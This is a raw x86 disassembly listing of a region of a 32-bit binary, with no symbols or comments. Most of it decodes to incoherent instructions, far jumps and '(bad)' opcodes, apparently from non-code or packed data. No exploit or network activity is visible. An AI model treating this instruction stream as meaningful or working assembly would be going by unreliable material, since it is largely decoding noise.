  405d5e:	in     al,0x2e
  405d60:	int3   
  405d61:	gs dec ebx
  405d63:	or     BYTE PTR [ebx],dl
  405d65:	cdq    
  405d66:	leave  
  405d67:	aaa    
  405d68:	xchg   DWORD PTR [ebx-0x380c0a61],ecx
  405d6e:	rcl    BYTE PTR [ecx+0x2a],1
  405d71:	das    
  405d72:	xor    DWORD PTR [ebp+ebp*4+0x15b4fc94],ebx
  405d79:	out    0xbe,eax
  405d7b:	mov    WORD PTR [edx-0x4d],ss
  405d7e:	std    
  405d7f:	nop
  405d80:	ucomiss xmm7,DWORD PTR [edi+edi*8+0x3b]
  405d85:	xchg   esp,eax
  405d86:	stos   DWORD PTR es:[edi],eax
  405d87:	je     0x405d17
  405d89:	clc    
  405d8a:	or     BYTE PTR [esi-0x7e00c133],dl
  405d90:	dec    esp
  405d91:	xchg   ecx,eax
  405d92:	enter  0x7410,0xa6
  405d96:	inc    ecx
  405d97:	daa    
  405d98:	mov    ah,BYTE PTR [ecx-0x37]
  405d9b:	cmc    
  405d9c:	mov    edx,0x6af6cd98
  405da1:	jnp    0x405de8
  405da3:	mov    ch,0xf8
  405da5:	stc    
  405da6:	sub    ah,BYTE PTR [ebx-0x306b073f]
  405dac:	retf   0xf8f7
  405daf:	xor    ebx,DWORD PTR [eax-0x26845c3f]
  405db5:	lods   al,BYTE PTR ds:[esi]
  405db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405db7:	gs add ah,al
  405dba:	scas   eax,DWORD PTR es:[edi]
  405dbb:	xchg   edx,eax
  405dbc:	pop    ds
  405dbd:	inc    ebx
  405dbe:	fwait
  405dbf:	ja     0x405da0
  405dc1:	dec    ecx
  405dc2:	loope  0x405e15
  405dc4:	mov    edx,0xa6d5d671
  405dc9:	add    ecx,DWORD PTR [edx+ebx*8+0x2a]
  405dcd:	dec    esi
  405dce:	int3   
  405dcf:	sbb    DWORD PTR [ebp-0x931fcc5],ebx
  405dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dd6:	adc    esi,DWORD PTR [ecx-0xecdca82]
  405ddc:	jmp    0xc71c:0xd1ef457d
  405de3:	outs   dx,DWORD PTR ds:[esi]
  405de4:	repnz sahf 
  405de6:	fadd   QWORD PTR [edi-0x36]
  405de9:	shl    DWORD PTR [ebp-0x36],1
  405dec:	dec    esp
  405ded:	xchg   edi,eax
  405dee:	and    eax,0x8ec8533
  405df3:	imul   edi,DWORD PTR [edx+0x6d46a2e3],0xc16fc996
  405dfd:	or     ah,BYTE PTR [edx+esi*1-0x55]
  405e01:	xor    eax,0x6a724d5d
  405e06:	mov    BYTE PTR [ebp-0x7507c99a],al
  405e0c:	and    ebx,ebx
  405e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e0f:	retf   
  405e10:	push   edx
  405e11:	addr16 pop edx
  405e13:	sbb    DWORD PTR ds:0x767899dc,esi
  405e19:	popf   
  405e1a:	and    al,0xc0
  405e1c:	jecxz  0x405e87
  405e1e:	mov    ebx,0x8e3f43af
  405e23:	pop    esp
  405e24:	jmp    0x4df1:0x7b0de6dc
  405e2b:	pop    ss
  405e2c:	out    0xa,eax
  405e2e:	sub    BYTE PTR [edx+0x14],dl
  405e31:	add    BYTE PTR [ebx],0x80
  405e34:	std    
  405e35:	aad    0x55
  405e37:	in     eax,dx
  405e38:	inc    ebx
  405e39:	xchg   esi,eax
  405e3a:	fimul  WORD PTR [esi+0x50]
  405e3d:	in     al,0x1
  405e3f:	ds jmp 0x1030:0x1b8370ea
  405e47:	xor    bh,dl
  405e49:	pushf  
  405e4a:	jns    0x405dff
  405e4c:	fist   DWORD PTR [esi]
  405e4e:	pop    esp
  405e4f:	jp     0x405e6c
  405e51:	inc    ecx
  405e52:	popa   
  405e53:	std    
  405e54:	fst    DWORD PTR [ebx-0x66]
  405e57:	sbb    BYTE PTR [edx-0x7c],bh
  405e5a:	dec    eax
  405e5b:	push   es
  405e5c:	punpckhdq mm2,QWORD PTR [esi+0x357b8e1c]
  405e63:	mov    ds:0x51668ad5,al
  405e68:	and    DWORD PTR [ebx+0x53],ecx
  405e6b:	mov    bh,0x70
  405e6d:	addr16 add eax,edi
  405e70:	inc    DWORD PTR [edi+esi*8]
  405e73:	ja     0x405e4c
  405e75:	xchg   esi,eax
  405e76:	leave  
  405e77:	sbb    BYTE PTR ds:0xb52c9352,ah
  405e7d:	(bad)  
  405e7e:	stos   DWORD PTR es:[edi],eax
  405e7f:	lods   eax,DWORD PTR ds:[esi]
  405e80:	jno    0x405e6e
  405e82:	lar    eax,WORD PTR [esi-0x2104ecf5]
  405e89:	push   ebp
  405e8a:	xchg   edx,eax
  405e8b:	or     BYTE PTR [ecx],ah
  405e8d:	fisttp DWORD PTR [ebp+0x6efa21c]
  405e93:	(bad)  
  405e94:	xchg   BYTE PTR [edx-0x78c07de2],bl
  405e9a:	sbb    al,0xe
  405e9c:	repnz and dh,BYTE PTR [ecx-0x7d]
  405ea0:	mov    bh,0x10
  405ea2:	hlt    
  405ea3:	jle    0x405e5b
  405ea5:	sbb    BYTE PTR [ecx],cl
  405ea7:	fwait
  405ea8:	jne    0x405e95
  405eaa:	jmp    0x405ea1
  405eac:	enter  0xa767,0xd1
  405eb0:	clc    
  405eb1:	(bad)  
  405eb2:	lock test eax,0x4ef0ee7d
  405eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eb9:	jae    0x405f28
  405ebb:	mov    bl,0xc0
  405ebd:	mov    dl,0x82
  405ebf:	(bad)  
  405ec0:	stc    
  405ec1:	jo     0x405ecd
  405ec3:	pusha  
  405ec4:	jl     0x405f3f
  405ec6:	inc    edx
  405ec7:	or     DWORD PTR [edx-0x975eb82],eax
  405ecd:	jp     0x405f32
  405ecf:	or     esi,DWORD PTR [ebx+0x1a80bb37]
  405ed5:	ds sti 
  405ed7:	sbb    eax,0x65e786f3
  405edc:	mov    cl,BYTE PTR [edx-0x79]
  405edf:	xchg   ecx,eax
  405ee0:	mov    eax,0xbf12c200
  405ee5:	loop   0x405eba
  405ee7:	sbb    BYTE PTR ds:0x268a5cb7,dh
  405eed:	sub    DWORD PTR [edx+ebx*8-0x1f],edi
  405ef1:	jecxz  0x405e76
  405ef3:	imul   ebp
  405ef5:	mov    cs,esi
  405ef7:	arpl   sp,di
  405ef9:	add    bl,BYTE PTR [edi]
  405efb:	loop   0x405ed6
  405efd:	dec    edx
  405efe:	push   0x6501170d
  405f03:	mov    bl,0xd0
  405f05:	or     edi,DWORD PTR [edx+ecx*8]
  405f08:	mov    ds:0xbdace51d,eax
  405f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f0e:	test   ecx,0x5f0c798d
  405f14:	test   BYTE PTR [edi-0x8],ah
  405f17:	xchg   edx,eax
  405f18:	mov    cl,0x52
  405f1a:	mov    ecx,0xd130a542
  405f1f:	(bad)  
  405f20:	cmp    eax,0x9b03693b
  405f25:	xchg   edx,eax
  405f26:	pop    ecx
  405f27:	cdq    
  405f28:	mov    bh,0x68
  405f2a:	or     bl,BYTE PTR [esi+0x21647c81]
  405f30:	xlat   BYTE PTR ds:[ebx]
  405f31:	xchg   edi,eax
  405f32:	out    0xb5,eax
  405f34:	cmp    DWORD PTR [ebx+0x20113553],ecx
  405f3a:	add    ebp,DWORD PTR [edi-0x17]
  405f3d:	xlat   BYTE PTR ds:[ebx]
  405f3e:	rol    BYTE PTR [eax-0x4e08f93c],1
  405f44:	mov    edi,DWORD PTR [ecx-0x3f9974b0]
  405f4a:	mov    ch,0xae
  405f4c:	ins    DWORD PTR es:[edi],dx
  405f4d:	imul   edi,DWORD PTR [esi-0x3f618b27],0x6f
  405f54:	stc    
  405f55:	xor    dl,BYTE PTR [edx+0x1]
  405f58:	push   ds
  405f59:	dec    esi
  405f5a:	adc    al,0x18
  405f5c:	and    esi,DWORD PTR [ebp-0x47a12312]
  405f62:	mov    ah,0x13
  405f64:	pop    ss
  405f65:	mov    dl,0x58
  405f67:	jbe    0x405f3a
  405f69:	add    al,0xc9
  405f6b:	cdq    
  405f6c:	xor    al,0x66
  405f6e:	repnz xchg dl,ch
  405f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f72:	cmp    eax,DWORD PTR ds:0xf73a63e6
  405f78:	push   cs
  405f79:	inc    edx
  405f7a:	and    DWORD PTR [eax-0x753cfe7e],esi
  405f80:	dec    ebx
  405f81:	scas   al,BYTE PTR es:[edi]
  405f82:	push   ecx
  405f83:	aam    0x5a
  405f85:	adc    al,BYTE PTR ds:0xd0579794
  405f8b:	pop    ecx
  405f8c:	imul   ebx,ecx,0xd
  405f8f:	mov    al,0x99
  405f91:	pop    ebp
  405f92:	fisub  WORD PTR [eax]
  405f94:	loope  0x405feb
  405f96:	adc    cl,al
  405f98:	lods   eax,DWORD PTR ds:[esi]
  405f99:	mov    edi,0x7d393164
  405f9e:	les    edi,FWORD PTR [eax-0x20db0da4]
  405fa4:	mov    dl,0xb6
  405fa6:	mov    edx,0x5f50ca37
  405fab:	rol    DWORD PTR [edi+0x6c4527fb],cl
  405fb1:	dec    edi
  405fb2:	in     al,dx
  405fb3:	sahf   
  405fb4:	loop   0x405fd0
  405fb6:	xor    BYTE PTR [esi],0xbb
  405fb9:	in     al,0x83
  405fbb:	sbb    eax,0x65e9989f
  405fc0:	jae    0x406029
  405fc2:	or     BYTE PTR [ebx-0x2],0xc6
  405fc6:	jmp    0x106c:0xc154033e
  405fcd:	mov    ah,0xb6
  405fcf:	test   al,0x3a
  405fd1:	mov    esp,0x9c152092
  405fd6:	not    BYTE PTR [ebx]
  405fd8:	sub    BYTE PTR [eax+0xf4aa32e],bh
  405fde:	popf   
  405fdf:	pusha  
  405fe0:	jecxz  0x405fbf
  405fe2:	jmp    0xca7c:0xd6279cb2
  405fe9:	sub    eax,0xcc2f113
  405fee:	pop    ss
  405fef:	retf   
  405ff0:	hlt    
  405ff1:	sub    BYTE PTR [edi+edi*1-0x39f773f9],dl
  405ff8:	or     BYTE PTR [edx-0x252f542d],0x54
  405fff:	xlat   BYTE PTR ds:[ebx]
  406000:	push   esi
  406001:	xsha256 (bad)
  406002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406003:	adc    DWORD PTR ds:0x435ff704,ebp
  406009:	gs test ebp,ebx
  40600c:	xor    ebp,edx
  40600e:	aaa    
  40600f:	mov    dl,0x8d
  406011:	aad    0x6d
  406013:	bound  eax,QWORD PTR [esi+0xf]
  406016:	retf   0xf55f
  406019:	pop    ds
  40601a:	(bad)  
  40601b:	je     0x405fc9
  40601d:	xor    al,0x99
  40601f:	cmp    dh,BYTE PTR [edx+0x76d9ed51]
  406025:	arpl   WORD PTR es:[edx+0x63],bx
  406029:	adc    BYTE PTR [eax+0x58],al
  40602c:	dec    esp
  40602d:	popa   
  40602e:	jb     0x405ff7
  406030:	push   esi
  406031:	mov    ds:0x27bff892,eax
  406036:	push   ebx
  406037:	das    
  406038:	fwait
  406039:	and    ch,BYTE PTR [edi+0x2c]
  40603c:	pop    esi
  40603d:	mov    ch,0x90
  40603f:	ret    0xb141
  406042:	in     al,0x2e
  406044:	jmp    0x40607d
  406046:	jbe    0x406035
  406048:	pop    edx
  406049:	sub    edi,DWORD PTR [ebx]
  40604b:	imul   cl
  40604d:	jae    0x406079
  40604f:	dec    edi
  406050:	aam    0x64
  406052:	sub    eax,0x8522f56
  406057:	aad    0x1e
  406059:	leave  
  40605a:	mov    eax,DWORD PTR [edx-0x4e]
  40605d:	stos   BYTE PTR es:[edi],al
  40605e:	push   cs
  40605f:	fwait
  406060:	pop    esp
  406061:	xchg   BYTE PTR [eax+0x66],bl
  406064:	mov    ecx,0xd4054615
  406069:	and    al,BYTE PTR [edx]
  40606b:	mov    esp,0xed653000
  406070:	sbb    edi,DWORD PTR [esi+eiz*2]
  406073:	outs   dx,BYTE PTR ds:[esi]
  406074:	sub    dh,BYTE PTR [edx+esi*8-0x29]
  406078:	xchg   ecx,eax
  406079:	imul   esp,edx,0x73
  40607c:	call   0xd7567c9e
  406081:	xchg   esi,eax
  406082:	dec    ebp
  406083:	aam    0x11
  406085:	add    edx,ebx
  406087:	push   edx
  406088:	repnz sbb BYTE PTR [ecx],0xf8
  40608c:	fmul   QWORD PTR [ecx]
  40608e:	xor    al,0x8b
  406090:	add    eax,0xfd8997b9
  406095:	sub    ecx,DWORD PTR [esp+eiz*8]
  406098:	adc    eax,0x8d9e768c
  40609d:	dec    esp
  40609e:	or     al,0x68
  4060a0:	aam    0xe3
  4060a2:	sbb    BYTE PTR [ebx],bh
  4060a4:	call   0x7b04e796
  4060a9:	lea    ebp,ds:0x50f2be03
  4060af:	rcl    eax,1
  4060b1:	mov    bl,0x52
  4060b3:	pushf  
  4060b4:	retf   
  4060b5:	pop    ds
  4060b6:	mov    al,BYTE PTR [ecx]
  4060b8:	xchg   ebp,eax
  4060b9:	fmul   st(1),st
  4060bb:	push   edi
  4060bc:	enter  0x697b,0xb4
  4060c0:	push   cs
  4060c1:	scas   eax,DWORD PTR es:[edi]
  4060c2:	jle    0x406135
  4060c4:	jns    0x4060c4
  4060c6:	ins    BYTE PTR es:[edi],dx
  4060c7:	jno    0x406065
  4060c9:	xchg   ebx,eax
  4060ca:	clc    
  4060cb:	iret   
  4060cc:	jecxz  0x40606f
  4060ce:	cmp    DWORD PTR [esi],edx
  4060d0:	fistp  DWORD PTR [edx-0x47]
  4060d3:	(bad)  
  4060d4:	xadd   DWORD PTR [ecx+0x6c1d8b93],ebx
  4060db:	mov    cl,0xa5
  4060dd:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4060df:	cmp    esi,DWORD PTR [eax]
  4060e1:	dec    edi
  4060e2:	cdq    
  4060e3:	fdiv   QWORD PTR [eax]
  4060e5:	fst    DWORD PTR [eax-0x70]
  4060e8:	or     al,ah
  4060ea:	call   0x64602fe4
  4060ef:	ret    0x318
  4060f2:	mul    BYTE PTR [eax-0x728e509e]
  4060f8:	inc    esp
  4060f9:	add    eax,0xcc4589fc
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	xor    bh,BYTE PTR [edx]
  40612e:	imul   BYTE PTR [edx+0x78]
  406131:	mov    ds:0x129e1818,eax
  406136:	sbb    BYTE PTR [eax],bl
  406138:	push   edi
  406139:	xlat   BYTE PTR ds:[ebx]
  40613a:	xchg   edi,eax
  40613b:	sub    BYTE PTR [esi+eiz*4],ch
  40613e:	or     ecx,DWORD PTR [ebp-0x205e321d]
  406144:	xchg   ebx,eax
  406145:	xor    eax,0x9d78fc07
  40614a:	mov    WORD PTR [edx+0x6e],gs
  40614d:	pop    edi
  40614e:	and    bl,BYTE PTR [edi]
  406150:	mov    ds:0x94892cd6,eax
  406155:	cmp    eax,edi
  406157:	int    0xe1
  406159:	loop   0x406143
  40615b:	adc    eax,0xe562c39d
  406160:	sar    DWORD PTR [ebx+0x55],1
  406163:	push   cs
  406164:	push   ds
  406165:	mov    edi,0xbd9dd207
  40616a:	cmp    cl,0x39
  40616d:	or     eax,0x1aef434b
  406172:	xchg   esi,eax
  406173:	push   ss
  406174:	sub    eax,0x22746d91
  406179:	sub    eax,0x55dba906
  40617e:	repz lock jno 0x4061e7
  406182:	pop    edx
  406183:	or     esp,edi
  406185:	icebp  
  406186:	div    BYTE PTR [ebx+0x3412d45a]
  40618c:	clc    
  40618d:	enter  0xb074,0x32
  406191:	paddd  mm7,QWORD PTR [edi+0x7694e9fe]
  406198:	and    eax,0xf5a93619
  40619d:	mov    edi,0x397a464f
  4061a2:	push   0x8b7fce24
  4061a7:	push   esi
  4061a8:	stos   DWORD PTR es:[edi],eax
  4061a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061aa:	sub    dl,bl
  4061ac:	inc    edi
  4061ad:	stos   DWORD PTR es:[edi],eax
  4061ae:	leave  
  4061af:	mov    eax,ds:0xe91ccff9
  4061b4:	call   0x51e8:0xb2cddf70
  4061bb:	pop    ebp
  4061bc:	imul   ecx,DWORD PTR [edi],0x44a4077
  4061c2:	stos   BYTE PTR es:[edi],al
  4061c3:	push   0x20
  4061c5:	inc    ecx
  4061c6:	lahf   
  4061c7:	test   al,0xec
  4061c9:	inc    ecx
  4061ca:	cmp    ecx,DWORD PTR [edi]
  4061cc:	xchg   edx,eax
  4061cd:	xchg   esp,eax
  4061ce:	adc    eax,0xf2666a3f
  4061d3:	out    dx,eax
  4061d4:	aaa    
  4061d5:	cmp    dl,bl
  4061d7:	fdiv   QWORD PTR [ecx-0x6a]
  4061da:	sub    al,0x85
  4061dc:	xor    al,0x87
  4061de:	imul   esi,DWORD PTR [edi-0xaeb66a0],0xcedfc1c6
  4061e8:	shl    DWORD PTR [edx],0xef
  4061eb:	daa    
  4061ec:	mov    ?,WORD PTR [ecx]
  4061ee:	(bad)  [edx+0x1a0c5cc2]
  4061f4:	dec    edi
  4061f5:	pop    esi
  4061f6:	xor    BYTE PTR [eax+eiz*8+0x72],0xd2
  4061fb:	sbb    ebp,edx
  4061fd:	lds    ebx,FWORD PTR [eax-0x53]
  406200:	sub    edi,DWORD PTR [edi]
  406202:	mov    ah,0x1e
  406204:	pushf  
  406205:	pop    esp
  406206:	xchg   esi,eax
  406207:	pop    ebx
  406208:	or     ecx,DWORD PTR [edi-0x18]
  40620b:	pop    edi
  40620c:	(bad)  
  40620e:	data16 fnstcw WORD PTR [ebx-0x28ca02e8]
  406215:	and    cl,al
  406217:	sub    al,0xb9
  406219:	pop    edx
  40621a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621b:	in     eax,0xe4
  40621d:	xor    BYTE PTR [ebx+0x4cb4c058],dl
  406223:	jbe    0x406271
  406225:	iret   
  406226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406227:	(bad)  
  406229:	outs   dx,DWORD PTR ds:[esi]
  40622a:	hlt    
  40622b:	comiss xmm0,DWORD PTR [edi]
  40622e:	lods   al,BYTE PTR ds:[esi]
  40622f:	mov    ss,WORD PTR [ebx+ebp*2-0x7d]
  406233:	fisttp WORD PTR [edx-0x22]
  406236:	jecxz  0x406285
  406238:	loop   0x4062ac
  40623a:	add    ebp,DWORD PTR [ecx+eax*4]
  40623d:	mov    esp,0x6809cfd
  406242:	ror    BYTE PTR [eax+0x51d30710],1
  406248:	pop    ebp
  406249:	dec    edx
  40624a:	or     DWORD PTR [ecx],ebp
  40624c:	push   es
  40624d:	pop    esp
  40624e:	jg     0x406215
  406250:	test   DWORD PTR [ebx],ecx
  406252:	dec    ebx
  406253:	dec    edx
  406254:	out    dx,eax
  406255:	inc    ebp
  406256:	leave  
  406257:	clc    
  406258:	push   ds
  406259:	call   0xf9b8cb52
  40625e:	xor    ch,dh
  406260:	or     al,0xc6
  406262:	clc    
  406263:	ins    DWORD PTR es:[edi],dx
  406264:	test   al,0xa3
  406266:	pop    esp
  406267:	xor    al,BYTE PTR [ecx-0xe]
  40626a:	sub    BYTE PTR [ebp+0x3ebc2d79],ah
  406270:	jmp    0x5cd13847
  406275:	ins    DWORD PTR es:[edi],dx
  406276:	dec    ebx
  406277:	rcr    BYTE PTR [eax-0x57],cl
  40627a:	dec    eax
  40627b:	inc    esi
  40627c:	inc    esi
  40627d:	lahf   
  40627e:	retf   0xb188
  406281:	sbb    DWORD PTR [esi+0xb08b43a],esp
  406287:	inc    ecx
  406288:	jns    0x4062d2
  40628a:	and    DWORD PTR [eax-0x62],esp
  40628d:	lods   eax,DWORD PTR ds:[esi]
  40628e:	or     DWORD PTR [esi+0x33],0xffffffe5
  406292:	test   eax,0xac775549
  406297:	add    edx,DWORD PTR [edi-0x58]
  40629a:	mov    edi,0x52673c60
  40629f:	or     eax,0x37ad1298
  4062a4:	call   DWORD PTR [ecx]
  4062a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062a7:	test   al,0x35
  4062a9:	inc    esp
  4062aa:	mov    ds:0x4e6a8b39,al
  4062af:	out    0xdf,eax
  4062b1:	dec    edx
  4062b2:	push   0xe306008d
  4062b7:	jo     0x4062fc
  4062b9:	cmp    BYTE PTR [edx],cl
  4062bb:	fist   WORD PTR [ebx+0x3f]
  4062be:	inc    edi
  4062bf:	xchg   ecx,eax
  4062c0:	das    
  4062c1:	pop    esp
  4062c2:	and    eax,DWORD PTR [ebp*4-0x21a6fdbd]
  4062c9:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062cb:	cmp    DWORD PTR [edi-0x3464eea6],esi
  4062d1:	xor    esp,edi
  4062d3:	push   ss
  4062d4:	xlat   BYTE PTR ds:[ebx]
  4062d5:	test   eax,0xaaaddd20
  4062da:	jbe    0x4062eb
  4062dc:	pop    ebx
  4062dd:	test   BYTE PTR [edi-0x5bd1fb1],cl
  4062e3:	mov    WORD PTR [esi],ds
  4062e5:	ficomp DWORD PTR [eax]
  4062e7:	or     bl,BYTE PTR [esi-0x1b1cc986]
  4062ed:	mov    esi,0x34a0db8c
  4062f2:	(bad)
  4062f6:	out    dx,al
  4062f7:	outs   dx,BYTE PTR ds:[esi]
  4062f8:	movmskps esi,xmm6
  4062fb:	aaa    
  4062fc:	add    DWORD PTR ds:0x94ea8726,0xffffffe5
  406303:	into   
  406304:	inc    eax
  406305:	xchg   ebp,eax
  406306:	popf   
  406307:	jae    0x40629e
  406309:	dec    ebp
  40630a:	inc    esp
  40630b:	ins    DWORD PTR es:[edi],dx
  40630c:	sub    al,0x4e
  40630e:	mov    esp,0xfbff39d8
  406313:	pop    ebx
  406314:	mov    ah,0x39
  406316:	add    al,0xd2
  406318:	(bad)  
  40631a:	lods   eax,DWORD PTR ds:[esi]
  40631b:	test   al,0xf5
  40631d:	js     0x406300
  40631f:	pop    esi
  406320:	not    BYTE PTR [ecx-0x43]
  406323:	inc    ebp
  406324:	jmp    0xee8f:0xbeec1297
  40632b:	xlat   BYTE PTR ds:[ebx]
  40632c:	mov    eax,0xa48694c9
  406331:	(bad)  
  406332:	jmp    0x406371
  406334:	test   eax,0x815965bc
  406339:	inc    esp
  40633a:	psraw  mm0,QWORD PTR [esi+0x6a21e704]
  406341:	in     eax,0x13
  406343:	xchg   BYTE PTR [ecx],ch
  406345:	sbb    al,0x34
  406347:	cmp    al,0x51
  406349:	cmp    ebp,DWORD PTR [ebp+0x726e5876]
  40634f:	pop    edi
  406350:	outs   dx,DWORD PTR ds:[esi]
  406351:	aam    0xd0
  406353:	cmp    bl,dh
  406355:	inc    edx
  406356:	dec    esi
  406357:	and    bl,BYTE PTR [esi]
  406359:	push   edx
  40635a:	mov    BYTE PTR [esi],bl
  40635c:	and    DWORD PTR [eax+0x30596883],edi
  406362:	aam    0xdc
  406364:	push   0xffffffa5
  406366:	pop    esi
  406367:	test   eax,0xc81ee91e
  40636c:	popf   
  40636d:	pushw  ds
  40636f:	std    
  406370:	jmp    0x406324
  406372:	cmp    al,0xa7
  406374:	mov    ecx,0x12be0419
  406379:	cmp    esp,DWORD PTR [eax+0x68f03db9]
  40637f:	neg    DWORD PTR [edi]
  406381:	dec    ecx
  406382:	or     ebx,esp
  406384:	in     eax,0x1c
  406386:	cmp    DWORD PTR [edi],edx
  406388:	mov    ah,0xa8
  40638a:	inc    ecx
  40638b:	into   
  40638c:	sub    cl,BYTE PTR [edx]
  40638e:	xor    BYTE PTR [esi+eiz*2],dh
  406391:	ja     0x40638d
  406393:	in     al,0xfa
  406395:	and    DWORD PTR [edi-0x71],esp
  406398:	pop    ecx
  406399:	in     al,dx
  40639a:	pop    es
  40639b:	fwait
  40639c:	arpl   WORD PTR [edi+esi*4],dx
  40639f:	test   al,0xe3
  4063a1:	std    
  4063a2:	aam    0xd1
  4063a4:	loopne 0x4063bc
  4063a6:	add    BYTE PTR gs:[eax],0x2
  4063aa:	or     al,0x1f
  4063ac:	mov    al,BYTE PTR [ebp+0x26ec5229]
  4063b2:	jbe    0x4063d7
  4063b4:	pop    esi
  4063b5:	pop    es
  4063b6:	add    eax,0x4589ea5b
  4063bb:	gs sbb al,0xc6
  4063be:	(bad)  
  4063bf:	xchg   edi,eax
  4063c0:	and    BYTE PTR [edi-0x6d],cl
  4063c3:	push   0xffffffe5
  4063c5:	pop    edx
  4063c6:	sub    DWORD PTR [edi-0x2],esp
  4063c9:	sub    al,0x56
  4063cb:	test   BYTE PTR [ecx-0x60946a36],ch
  4063d1:	cmp    BYTE PTR [ecx-0x1d],dl
  4063d4:	enter  0x8c6a,0x5d
  4063d8:	mov    cl,0xa1
  4063da:	or     al,dl
  4063dc:	es push esi
  4063de:	call   0xd2c2d407
  4063e3:	pop    esi
  4063e4:	sti    
  4063e5:	and    BYTE PTR [eax],al
  4063e7:	in     eax,dx
  4063e8:	mov    esi,DWORD PTR [ebx+0x44]
  4063eb:	pop    ebp
  4063ec:	or     eax,0xb294181
  4063f2:	sub    BYTE PTR [ecx],dl
  4063f4:	adc    DWORD PTR [esi],0x36c0d21d
  4063fa:	clc    
  4063fb:	jno    0x406448
  4063fd:	sbb    BYTE PTR [ebp-0x43],ch
  406400:	and    DWORD PTR [edx-0x66],ebx
  406403:	push   ebp
  406404:	mov    bl,0x4f
  406406:	and    ebp,DWORD PTR [edi+ebp*1-0x7f0b9e06]
  40640d:	cdq    
  40640e:	mov    esp,ecx
  406410:	iret   
  406411:	sbb    al,0x17
  406413:	add    eax,0xd3793b5
  406418:	pop    ecx
  406419:	popa   
  40641a:	inc    DWORD PTR [ebx-0xf]
  40641d:	jo     0x406440
  40641f:	xchg   ebx,eax
  406420:	in     al,dx
  406421:	(bad)  
  406422:	dec    edi
  406423:	pop    es
  406424:	inc    ebp
  406425:	stc    
  406426:	cmp    ah,BYTE PTR [eax]
  406428:	pop    es
  406429:	pusha  
  40642a:	gs mov ah,0xa2
  40642d:	repnz inc ebx
  40642f:	popa   
  406430:	mov    ?,WORD PTR [edx]
  406432:	ret    
  406433:	daa    
  406434:	mov    bl,0x1c
  406436:	ja     0x4064a4
  406438:	(bad)  
  406439:	mov    eax,ds:0xe64a3868
  40643e:	pop    ds
  40643f:	shr    esp,cl
  406441:	push   ebp
  406442:	push   0xffffffd4
  406444:	jp     0x406407
  406446:	dec    ebp
  406447:	xchg   ecx,eax
  406448:	pop    ss
  406449:	xchg   dl,bl
  40644b:	xchg   ebx,eax
  40644c:	retf   
  40644d:	jmp    0x4064bc
  40644f:	push   ss
  406450:	push   cs
  406451:	inc    ecx
  406452:	mov    ds:0x29d958f7,eax
  406457:	push   ebx
  406458:	mov    dh,0xb5
  40645a:	mov    esp,0x2418be31
  40645f:	popa   
  406460:	(bad)  
  406461:	lods   eax,DWORD PTR ds:[esi]
  406462:	lahf   
  406463:	or     eax,0xcb71d09b
  406468:	pop    DWORD PTR [edi+0x46]
  40646b:	xchg   esi,ebx
  40646d:	dec    ebx
  40646e:	repz scas al,BYTE PTR es:[edi]
  406470:	cmp    al,BYTE PTR [ebx]
  406472:	sahf   
  406473:	dec    esp
  406474:	pop    edx
  406475:	fstp   st(6)
  406477:	pop    edx
  406478:	jns    0x4063fc
  40647a:	push   ebx
  40647b:	xlat   BYTE PTR ds:[ebx]
  40647c:	dec    eax
  40647d:	cli    
  40647e:	(bad)  
  40647f:	cmp    eax,0xfd7a7b49
  406484:	dec    edx
  406485:	push   ebx
  406486:	jle    0x406461
  406488:	jne    0x406491
  40648a:	(bad)  
  40648b:	pop    eax
  40648c:	(bad)  
  40648d:	loop   0x40646e
  40648f:	into   
  406490:	mov    dl,0xf
  406492:	fbld   TBYTE PTR [ecx-0x317d0e46]
  406498:	ja     0x40649c
  40649a:	cmp    bl,dh
  40649c:	or     DWORD PTR [ebx+ecx*4+0x3e43a2a6],ebp
  4064a3:	jne    0x406462
  4064a5:	lods   al,BYTE PTR ds:[esi]
  4064a6:	daa    
  4064a7:	jp     0x40645d
  4064a9:	pop    ss
  4064aa:	xchg   DWORD PTR [edx+0x78],esi
  4064ad:	test   eax,0xf4336ae0
  4064b2:	push   es
  4064b3:	not    al
  4064b5:	mov    edi,edx
  4064b7:	out    dx,eax
  4064b8:	fnstsw WORD PTR [edi]
  4064ba:	push   edi
  4064bb:	dec    ecx
  4064bc:	sub    eax,0xe878f502
  4064c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064c2:	inc    esp
  4064c3:	inc    ecx
  4064c4:	(bad)  
  4064c5:	lods   eax,DWORD PTR ds:[esi]
  4064c6:	ja     0x4064c1
  4064c8:	push   ecx
  4064c9:	cmp    edi,DWORD PTR [eax]
  4064cb:	inc    esp
  4064cc:	ja     0x4064ff
  4064ce:	push   0x3643ed97
  4064d3:	adc    DWORD PTR [ebp-0x2d],0xdf0a0f4c
  4064da:	xlat   BYTE PTR ds:[ebx]
  4064db:	jle    0x4064f0
  4064dd:	jmp    0x5702:0xd762e64c
  4064e4:	frstor [eax*1+0x1ade208]
  4064eb:	sub    dh,BYTE PTR [esi+0x5f]
  4064ee:	popf   
  4064ef:	add    cl,ah
  4064f1:	mov    esi,0x18442c3a
  4064f6:	out    dx,eax
  4064f7:	inc    esp
